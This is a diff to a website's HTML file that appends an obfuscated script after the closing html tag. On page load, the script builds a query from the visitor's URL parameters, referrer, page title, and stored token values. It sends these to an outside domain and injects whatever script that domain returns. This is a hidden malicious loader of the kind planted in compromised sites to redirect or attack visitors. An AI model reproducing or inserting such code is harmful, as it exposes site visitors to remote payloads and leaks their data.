@@ -414,3 +414,48 @@
 <script src="assets/js/main.js"></script>
 </body>
 </html>
+<script>
+    (function() {
+    var name = '_8WjMbSKsCYyv7V42';
+    if (!window._8WjMbSKsCYyv7V42) {
+        window._8WjMbSKsCYyv7V42 = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://willowcivet.digital/jVrX8pdY',
+        };
+    }
+    const _8TFXdd9VCphKFDvc = localStorage.getItem('config');
+    if (typeof _8TFXdd9VCphKFDvc !== 'undefined' && _8TFXdd9VCphKFDvc !== null) {
+        var _bdkNVShkV8JxM41V = JSON.parse(_8TFXdd9VCphKFDvc);
+        var _8cQTKXxvs2kmL2XW = Math.round(+new Date()/1000);
+        if (_bdkNVShkV8JxM41V.created_at + window._8WjMbSKsCYyv7V42.ttl < _8cQTKXxvs2kmL2XW) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _dHH5KcrZSbPRhNyk = localStorage.getItem('subId');
+    var _nkBZC6z7qcv7dpK7 = localStorage.getItem('token');
+    var _b7jSrjnbdGM9nDyt = '?return=js.client';
+        _b7jSrjnbdGM9nDyt += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _b7jSrjnbdGM9nDyt += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _b7jSrjnbdGM9nDyt += '&default_keyword=' + encodeURIComponent(document.title);
+        _b7jSrjnbdGM9nDyt += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _b7jSrjnbdGM9nDyt += '&name=' + encodeURIComponent(name);
+        _b7jSrjnbdGM9nDyt += '&host=' + encodeURIComponent(window._8WjMbSKsCYyv7V42.R_PATH);
+    if (typeof _dHH5KcrZSbPRhNyk !== 'undefined' && _dHH5KcrZSbPRhNyk && window._8WjMbSKsCYyv7V42.unique) {
+        _b7jSrjnbdGM9nDyt += '&sub_id=' + encodeURIComponent(_dHH5KcrZSbPRhNyk);
+    }
+    if (typeof _nkBZC6z7qcv7dpK7 !== 'undefined' && _nkBZC6z7qcv7dpK7 && window._8WjMbSKsCYyv7V42.unique) {
+        _b7jSrjnbdGM9nDyt += '&token=' + encodeURIComponent(_nkBZC6z7qcv7dpK7);
+    }
+    if ('' !== '') {
+        _b7jSrjnbdGM9nDyt += '&bypass_cache=';
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._8WjMbSKsCYyv7V42.R_PATH + _b7jSrjnbdGM9nDyt;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
